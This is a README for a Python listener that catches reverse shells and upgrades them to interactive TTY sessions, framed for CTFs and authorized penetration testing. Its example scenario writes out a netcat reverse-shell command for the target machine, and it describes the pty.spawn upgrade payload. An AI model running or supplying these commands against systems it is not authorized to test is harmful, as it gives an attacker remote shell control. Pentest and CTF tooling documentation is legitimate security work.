***

# PTY Shell Listener

A simple Python-based listener designed to upgrade basic reverse shells into fully interactive TTY sessions. This tool automates the process of spawning a pseudo-terminal (`pty`) on the target machine, allowing for tab completion, text editing (vim/nano), and proper signal handling (Ctrl+C).

## ⚠️ Disclaimer
This tool is intended for **educational purposes**, CTF competitions (e.g., Hack The Box, TryHackMe), and authorized penetration testing only. Do not use this software on any system or network without explicit permission from the owner.

## 🚀 Features
- **Automatic PTY Spawn**: Sends the `python3 -c 'import pty; pty.spawn("/bin/bash")'` command automatically upon connection.
- **Raw Terminal Mode**: Configures the local terminal to raw mode to handle special characters and control sequences correctly.
- **Interactive Session**: Supports tab completion, history navigation, and full-screen applications.
- **Customizable**: Easily change the listening host and port via command-line arguments.
- **Signal Handling**: Gracefully restores terminal settings upon exit (prevents "broken" terminal states).

## 📋 Prerequisites
- Python 3.x
- Linux/macOS environment (due to reliance on `termios`, `tty`, and `pty` modules). *Note: This script will not work natively on Windows.*

## 🛠️ Installation
No external libraries are required. Just clone the repository or download the script:

```bash
git clone <repository-url>
cd pty-shell-listener
```

## 💻 Usage

### Basic Usage
Start the listener on the default port (4444):
```bash
python3 listener.py
```

### Custom Host and Port
Specify a custom port and bind address:
```bash
python3 listener.py -H 127.0.0.1 -p 8080
```

### Arguments
| Argument | Short | Description | Default |
| :--- | :--- | :--- | :--- |
| `--host` | `-H` | Host IP to bind to | `0.0.0.0` |
| `--port` | `-p` | Port to listen on | `4444` |

## 🔄 How It Works
1. **Listener Setup**: The script creates a TCP socket and binds it to the specified host/port.
2. **Connection Acceptance**: Waits for an incoming reverse shell connection.
3. **PTY Upgrade**: Immediately sends a Python one-liner to the connected client to spawn a bash shell with a pseudo-terminal.
4. **Terminal Raw Mode**: Switches the local terminal to raw mode using `termios` and `tty` to ensure keystrokes are sent directly to the remote shell without local interpretation.
5. **Data Relay**: Uses `select` to multiplex input from the local keyboard and output from the remote shell, ensuring a smooth interactive experience.

## 🧪 Example Scenario (CTF)
1. Start the listener on your attack machine:
   ```bash
   python3 listener.py -p 9001
   ```
2. Trigger a reverse shell from the target machine (e.g., via Netcat):
   ```bash
   # On Target Machine
   nc <YOUR_IP> 9001 -e /bin/sh
   ```
3. Enjoy your fully interactive TTY shell!

## 🛡️ Troubleshooting
- **Terminal looks broken after exit?**  
  The script includes a `finally` block to restore terminal settings. If it still fails, run `reset` or `stty sane` in your terminal.
- **Connection drops immediately?**  
  Ensure the target machine has `python3` installed. If not, you may need to modify the payload sent in `conn.sendall()` to use `perl`, `ruby`, or `script /dev/null -c bash`.

## 📜 License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
